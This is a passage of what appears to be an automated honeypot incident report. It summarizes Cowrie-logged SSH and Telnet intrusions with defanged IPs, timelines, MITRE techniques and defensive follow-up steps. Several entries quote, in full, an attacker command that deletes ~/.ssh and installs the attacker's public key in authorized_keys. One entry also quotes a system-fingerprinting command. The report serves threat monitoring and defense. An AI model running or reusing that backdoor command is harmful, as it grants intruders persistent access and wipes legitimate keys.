| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:13:25` | `cowrie.session.connect` |
| `2026-07-06 16:13:28` | `cowrie.client.version` |
| `2026-07-06 16:13:28` | `cowrie.client.kex` |
| `2026-07-06 16:13:37` | `cowrie.login.success` |
| `2026-07-06 16:13:43` | `cowrie.session.params` |
| `2026-07-06 16:13:43` | `cowrie.command.input` |
| `2026-07-06 16:13:43` | `cowrie.command.input` |
| `2026-07-06 16:13:43` | `cowrie.command.input` |
| `2026-07-06 16:13:43` | `cowrie.command.input` |
| `2026-07-06 16:13:43` | `cowrie.command.input` |
| `2026-07-06 16:13:43` | `cowrie.command.success` |
| `2026-07-06 16:13:43` | `cowrie.command.input` |
| `2026-07-06 16:13:43` | `cowrie.command.input` |
| `2026-07-06 16:13:43` | `cowrie.command.input` |
| `2026-07-06 16:13:43` | `cowrie.command.input` |
| `2026-07-06 16:13:46` | `cowrie.log.closed` |
| `2026-07-06 16:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d24405be5a46

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-07-06 16:13 |
| **Last Seen** | 2026-07-06 16:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:13:27` | `cowrie.session.connect` |
| `2026-07-06 16:13:27` | `cowrie.client.version` |
| `2026-07-06 16:13:27` | `cowrie.client.kex` |
| `2026-07-06 16:13:28` | `cowrie.login.success` |
| `2026-07-06 16:13:28` | `cowrie.session.params` |
| `2026-07-06 16:13:28` | `cowrie.command.input` |
| `2026-07-06 16:13:28` | `cowrie.command.failed` |
| `2026-07-06 16:13:29` | `cowrie.log.closed` |
| `2026-07-06 16:13:29` | `cowrie.session.params` |
| `2026-07-06 16:13:29` | `cowrie.command.input` |
| `2026-07-06 16:13:29` | `cowrie.session.file_download` |
| `2026-07-06 16:13:29` | `cowrie.log.closed` |
| `2026-07-06 16:13:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-581b9cdcee6c

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-07-06 16:13 |
| **Last Seen** | 2026-07-06 16:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:13:29` | `cowrie.session.connect` |
| `2026-07-06 16:13:29` | `cowrie.client.version` |
| `2026-07-06 16:13:29` | `cowrie.client.kex` |
| `2026-07-06 16:13:29` | `cowrie.login.success` |
| `2026-07-06 16:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-369added0610

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-07-06 16:13 |
| **Last Seen** | 2026-07-06 16:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:13:29` | `cowrie.session.connect` |
| `2026-07-06 16:13:29` | `cowrie.client.version` |
| `2026-07-06 16:13:29` | `cowrie.client.kex` |
| `2026-07-06 16:13:30` | `cowrie.login.success` |
| `2026-07-06 16:13:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05db6d5c202e

| Field | Detail |
|---|---|
| **Source IP** | `103.253.245[.]232` |
| **First Seen** | 2026-07-06 16:13 |
| **Last Seen** | 2026-07-06 16:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:13:38` | `cowrie.session.connect` |
| `2026-07-06 16:13:40` | `cowrie.telnet.option` |
| `2026-07-06 16:13:40` | `cowrie.telnet.option` |
| `2026-07-06 16:14:40` | `cowrie.login.success` |
| `2026-07-06 16:14:41` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `103.253.245[.]232` to AbuseIPDB if not already reported
- [ ] Block `103.253.245[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-538620e8e67c

| Field | Detail |
|---|---|
| **Source IP** | `172.184.241[.]11` |
| **First Seen** | 2026-07-06 16:14 |
| **Last Seen** | 2026-07-06 16:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:14:50` | `cowrie.session.connect` |
| `2026-07-06 16:14:50` | `cowrie.client.version` |
| `2026-07-06 16:14:50` | `cowrie.client.kex` |
| `2026-07-06 16:14:51` | `cowrie.login.success` |
| `2026-07-06 16:14:52` | `cowrie.session.params` |
| `2026-07-06 16:14:52` | `cowrie.command.input` |
| `2026-07-06 16:14:52` | `cowrie.command.failed` |
| `2026-07-06 16:14:52` | `cowrie.log.closed` |
| `2026-07-06 16:14:53` | `cowrie.session.params` |
| `2026-07-06 16:14:53` | `cowrie.command.input` |
| `2026-07-06 16:14:53` | `cowrie.session.file_download` |
| `2026-07-06 16:14:53` | `cowrie.log.closed` |
| `2026-07-06 16:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.184.241[.]11` to AbuseIPDB if not already reported
- [ ] Block `172.184.241[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ab1dc6c97eb

| Field | Detail |
|---|---|
| **Source IP** | `172.184.241[.]11` |
| **First Seen** | 2026-07-06 16:14 |
| **Last Seen** | 2026-07-06 16:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:14:53` | `cowrie.session.connect` |
| `2026-07-06 16:14:53` | `cowrie.client.version` |
| `2026-07-06 16:14:53` | `cowrie.client.kex` |
| `2026-07-06 16:14:53` | `cowrie.login.success` |
| `2026-07-06 16:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.184.241[.]11` to AbuseIPDB if not already reported
- [ ] Block `172.184.241[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-009bbe074ec0

| Field | Detail |
|---|---|
| **Source IP** | `172.184.241[.]11` |
| **First Seen** | 2026-07-06 16:14 |
| **Last Seen** | 2026-07-06 16:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:14:53` | `cowrie.session.connect` |
| `2026-07-06 16:14:53` | `cowrie.client.version` |
| `2026-07-06 16:14:54` | `cowrie.client.kex` |
| `2026-07-06 16:14:54` | `cowrie.login.success` |
| `2026-07-06 16:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.184.241[.]11` to AbuseIPDB if not already reported
- [ ] Block `172.184.241[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8426b7e0dad

| Field | Detail |
|---|---|
| **Source IP** | `180.247.179[.]206` |
| **First Seen** | 2026-07-06 16:15 |
| **Last Seen** | 2026-07-06 16:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:15:29` | `cowrie.session.connect` |
| `2026-07-06 16:15:29` | `cowrie.client.version` |
| `2026-07-06 16:15:30` | `cowrie.client.kex` |
| `2026-07-06 16:15:31` | `cowrie.login.success` |
| `2026-07-06 16:15:32` | `cowrie.session.params` |
| `2026-07-06 16:15:32` | `cowrie.command.input` |
| `2026-07-06 16:15:32` | `cowrie.command.failed` |
| `2026-07-06 16:15:33` | `cowrie.log.closed` |
| `2026-07-06 16:15:33` | `cowrie.session.params` |
| `2026-07-06 16:15:33` | `cowrie.command.input` |
| `2026-07-06 16:15:34` | `cowrie.session.file_download` |
| `2026-07-06 16:15:34` | `cowrie.log.closed` |
| `2026-07-06 16:15:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.247.179[.]206` to AbuseIPDB if not already reported
- [ ] Block `180.247.179[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4b8dc4c7697

| Field | Detail |
|---|---|
| **Source IP** | `180.247.179[.]206` |
| **First Seen** | 2026-07-06 16:15 |
| **Last Seen** | 2026-07-06 16:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:15:34` | `cowrie.session.connect` |
| `2026-07-06 16:15:34` | `cowrie.client.version` |
| `2026-07-06 16:15:34` | `cowrie.client.kex` |
| `2026-07-06 16:15:35` | `cowrie.login.success` |
| `2026-07-06 16:15:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.247.179[.]206` to AbuseIPDB if not already reported
- [ ] Block `180.247.179[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8c1f16a044a

| Field | Detail |
|---|---|
| **Source IP** | `180.247.179[.]206` |
| **First Seen** | 2026-07-06 16:15 |
| **Last Seen** | 2026-07-06 16:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:15:36` | `cowrie.session.connect` |
| `2026-07-06 16:15:36` | `cowrie.client.version` |
| `2026-07-06 16:15:36` | `cowrie.client.kex` |
| `2026-07-06 16:15:37` | `cowrie.login.success` |
| `2026-07-06 16:15:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.247.179[.]206` to AbuseIPDB if not already reported
- [ ] Block `180.247.179[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efa3be9cc1c6

| Field | Detail |
|---|---|
| **Source IP** | `113.171.81[.]144` |
| **First Seen** | 2026-07-06 16:17 |
| **Last Seen** | 2026-07-06 16:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:17:01` | `cowrie.session.connect` |
| `2026-07-06 16:17:01` | `cowrie.client.version` |
| `2026-07-06 16:17:01` | `cowrie.client.kex` |
| `2026-07-06 16:17:02` | `cowrie.login.success` |
| `2026-07-06 16:17:03` | `cowrie.session.params` |
| `2026-07-06 16:17:03` | `cowrie.command.input` |
| `2026-07-06 16:17:03` | `cowrie.command.failed` |
| `2026-07-06 16:17:03` | `cowrie.log.closed` |
| `2026-07-06 16:17:05` | `cowrie.session.params` |
| `2026-07-06 16:17:05` | `cowrie.command.input` |
| `2026-07-06 16:17:05` | `cowrie.session.file_download` |
| `2026-07-06 16:17:05` | `cowrie.log.closed` |
| `2026-07-06 16:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.171.81[.]144` to AbuseIPDB if not already reported
- [ ] Block `113.171.81[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ad86ec0672a

| Field | Detail |
|---|---|
| **Source IP** | `113.171.81[.]144` |
| **First Seen** | 2026-07-06 16:17 |
| **Last Seen** | 2026-07-06 16:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:17:05` | `cowrie.session.connect` |
| `2026-07-06 16:17:05` | `cowrie.client.version` |
| `2026-07-06 16:17:06` | `cowrie.client.kex` |
| `2026-07-06 16:17:08` | `cowrie.login.success` |
| `2026-07-06 16:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.171.81[.]144` to AbuseIPDB if not already reported
- [ ] Block `113.171.81[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8c599dd1379

| Field | Detail |
|---|---|
| **Source IP** | `113.171.81[.]144` |
| **First Seen** | 2026-07-06 16:17 |
| **Last Seen** | 2026-07-06 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:17:09` | `cowrie.session.connect` |
| `2026-07-06 16:17:09` | `cowrie.client.version` |
| `2026-07-06 16:17:09` | `cowrie.client.kex` |
| `2026-07-06 16:17:10` | `cowrie.login.success` |
| `2026-07-06 16:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.171.81[.]144` to AbuseIPDB if not already reported
- [ ] Block `113.171.81[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-447e71cb4315

| Field | Detail |
|---|---|
| **Source IP** | `103.155.47[.]50` |
| **First Seen** | 2026-07-06 16:17 |
| **Last Seen** | 2026-07-06 16:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:17:26` | `cowrie.session.connect` |
| `2026-07-06 16:17:26` | `cowrie.client.version` |
| `2026-07-06 16:17:26` | `cowrie.client.kex` |
| `2026-07-06 16:17:29` | `cowrie.login.success` |
| `2026-07-06 16:17:30` | `cowrie.session.params` |
| `2026-07-06 16:17:30` | `cowrie.command.input` |
| `2026-07-06 16:17:30` | `cowrie.command.failed` |
| `2026-07-06 16:17:30` | `cowrie.log.closed` |
| `2026-07-06 16:17:31` | `cowrie.session.params` |
| `2026-07-06 16:17:31` | `cowrie.command.input` |
| `2026-07-06 16:17:31` | `cowrie.session.file_download` |
| `2026-07-06 16:17:31` | `cowrie.log.closed` |
| `2026-07-06 16:17:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.155.47[.]50` to AbuseIPDB if not already reported
- [ ] Block `103.155.47[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec91edcea2c5

| Field | Detail |
|---|---|
| **Source IP** | `103.155.47[.]50` |
| **First Seen** | 2026-07-06 16:17 |
| **Last Seen** | 2026-07-06 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:17:31` | `cowrie.session.connect` |
| `2026-07-06 16:17:31` | `cowrie.client.version` |
| `2026-07-06 16:17:32` | `cowrie.client.kex` |
| `2026-07-06 16:17:33` | `cowrie.login.success` |
| `2026-07-06 16:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.155.47[.]50` to AbuseIPDB if not already reported
- [ ] Block `103.155.47[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7e538606b13

| Field | Detail |
|---|---|
| **Source IP** | `103.155.47[.]50` |
| **First Seen** | 2026-07-06 16:17 |
| **Last Seen** | 2026-07-06 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:17:33` | `cowrie.session.connect` |
| `2026-07-06 16:17:33` | `cowrie.client.version` |
| `2026-07-06 16:17:33` | `cowrie.client.kex` |
| `2026-07-06 16:17:34` | `cowrie.login.success` |
| `2026-07-06 16:17:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.155.47[.]50` to AbuseIPDB if not already reported
- [ ] Block `103.155.47[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5473580a88a7

| Field | Detail |
|---|---|
| **Source IP** | `36.37.73[.]242` |
| **First Seen** | 2026-07-06 16:21 |
| **Last Seen** | 2026-07-06 16:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:21:40` | `cowrie.session.connect` |
| `2026-07-06 16:21:40` | `cowrie.client.version` |
| `2026-07-06 16:21:41` | `cowrie.client.kex` |
| `2026-07-06 16:21:42` | `cowrie.login.success` |
| `2026-07-06 16:21:43` | `cowrie.session.params` |
| `2026-07-06 16:21:43` | `cowrie.command.input` |
| `2026-07-06 16:21:43` | `cowrie.command.failed` |
| `2026-07-06 16:21:43` | `cowrie.log.closed` |
| `2026-07-06 16:21:44` | `cowrie.session.params` |
| `2026-07-06 16:21:44` | `cowrie.command.input` |
| `2026-07-06 16:21:44` | `cowrie.session.file_download` |
| `2026-07-06 16:21:44` | `cowrie.log.closed` |
| `2026-07-06 16:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.37.73[.]242` to AbuseIPDB if not already reported
- [ ] Block `36.37.73[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c145121e2a6

| Field | Detail |
|---|---|
| **Source IP** | `36.37.73[.]242` |
| **First Seen** | 2026-07-06 16:21 |
| **Last Seen** | 2026-07-06 16:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:21:44` | `cowrie.session.connect` |
| `2026-07-06 16:21:44` | `cowrie.client.version` |
| `2026-07-06 16:21:45` | `cowrie.client.kex` |
| `2026-07-06 16:21:46` | `cowrie.login.success` |
| `2026-07-06 16:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.37.73[.]242` to AbuseIPDB if not already reported
- [ ] Block `36.37.73[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec189173d037

| Field | Detail |
|---|---|
| **Source IP** | `36.37.73[.]242` |
| **First Seen** | 2026-07-06 16:21 |
| **Last Seen** | 2026-07-06 16:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:21:46` | `cowrie.session.connect` |
| `2026-07-06 16:21:46` | `cowrie.client.version` |
| `2026-07-06 16:21:46` | `cowrie.client.kex` |
| `2026-07-06 16:21:48` | `cowrie.login.success` |
| `2026-07-06 16:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.37.73[.]242` to AbuseIPDB if not already reported
- [ ] Block `36.37.73[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91b60e73fe16

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
